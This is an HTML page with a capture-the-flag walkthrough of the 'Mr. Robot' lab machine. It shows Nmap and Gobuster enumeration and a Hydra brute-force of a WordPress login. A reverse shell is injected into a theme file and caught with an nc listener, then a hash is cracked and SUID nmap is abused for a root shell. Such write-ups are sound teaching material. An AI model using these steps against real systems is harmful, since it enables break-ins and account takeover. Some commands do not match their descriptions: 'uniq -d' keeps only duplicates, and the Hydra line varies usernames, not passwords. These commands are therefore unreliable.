<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mr. Robot Walkthrough</title>
  <link rel="stylesheet" href="../css/styles.css" />
</head>
<body>
  <div class="container">
    <h1>Mr. Robot Walkthrough</h1>
    <p><em>by axoryn</em></p>

    <h2>NMAP</h2>
    <pre><code>
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 02:6E:76:1C:2E:07 (Unknown)
    </code></pre>

    <h2>Enumerating HTTP and HTTPS</h2>
    <p>Interacting with these services doesn't yield much information.</p>
    <!-- img src="../assets/mrrobot/robots.txt.png" alt="robots.txt contents" -->

    <p>Checking out <code>robots.txt</code> reveals:</p>
    <pre><code>
User-agent: *
fsocity.dic
key-1-of-3.txt
    </code></pre>

    <p>We found the first key and a wordlist. Let's download it:</p>
    <pre><code>
wget http://10.10.99.69/fsocity.dic
    </code></pre>

    <p>After inspecting the file, we notice many duplicate entries. Let's remove them:</p>
    <pre><code>
sort fsocity.dic | uniq -d > clean-dic.txt
    </code></pre>

    <p>Using Gobuster, we discover this is a WordPress site:</p>
    <pre><code>
/wp-content           (Status: 301)
/admin                (Status: 301)
/audio                (Status: 301)
/intro                (Status: 200)
    </code></pre>

    <p>Accessing <code>/wp-login.php</code>, we find a login page.</p>
    <!-- img src="../assets/mrrobot/wp-login.png" alt="WordPress login page" -->

    <p>Testing some usernames, we find that 'elliot' is valid.</p>
    <!-- img src="../assets/mrrobot/valid-username.png" alt="Valid username found" -->

    <p>Using our cleaned wordlist, we brute-force the login:</p>
    <pre><code>
hydra -L clean-dic.txt -p test <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
    </code></pre>

    <p>Hydra finds valid credentials: <code>elliot:XXXXXXX</code></p>

    <p>After logging in, we can edit themes:</p>
    <!-- img src="../assets/mrrobot/theme-editor.png" alt="WordPress theme editor" -->

    <p>We edit the '404.php' template with a reverse shell from <a href="https://github.com/pentestmonkey/php-reverse-shell">pentestmonkey</a>, updating it with our IP and port.</p>
    <!-- img src="../assets/mrrobot/reverse-shell.png" alt="Injected reverse shell" -->

    <p>Start a listener on your machine:</p>
    <pre><code>
nc -lvnp 1337
    </code></pre>

    <p>We get a shell as 'daemon':</p>
    <pre><code>
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
    </code></pre>

    <h2>Privilege Escalation</h2>
    <p>In the 'robot' user's home directory, we find two files:</p>
    <pre><code>
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
    </code></pre>

    <p>We can't read the second key, but we can read the password hash:</p>
    <pre><code>
robot:c3fcd3d76192e4007dfb496cca67e13b
    </code></pre>

    <p>Using <a href="https://crackstation.net/">CrackStation</a>, we crack the hash.</p>
    <!-- img src="../assets/mrrobot/cracked-hash.png" alt="Cracked password hash" -->

    <p>We now have the password for 'robot'. To switch users, we need a stable shell:</p>
    <pre><code>
python3 -c 'import pty; pty.spawn("/bin/bash")'
    </code></pre>

    <h2>Root.txt</h2>
    <p>After some enumeration, we check for SUID binaries:</p>
    <pre><code>
find / -perm -u=s -type f 2>/dev/null
    </code></pre>

    <p>We find that 'nmap' has the SUID bit set. According to GTFOBins, it's exploitable.</p>
    <!-- img src="../assets/mrrobot/gtfobins-nmap.png" alt="GTFOBins nmap exploit" -->

    <p>We exploit it:</p>
    <pre><code>
nmap --interactive
nmap> !sh
# whoami
root
    </code></pre>

    <p>Now, we can read the third key in <code>/root</code>.</p>
  </div>
</body>
</html>
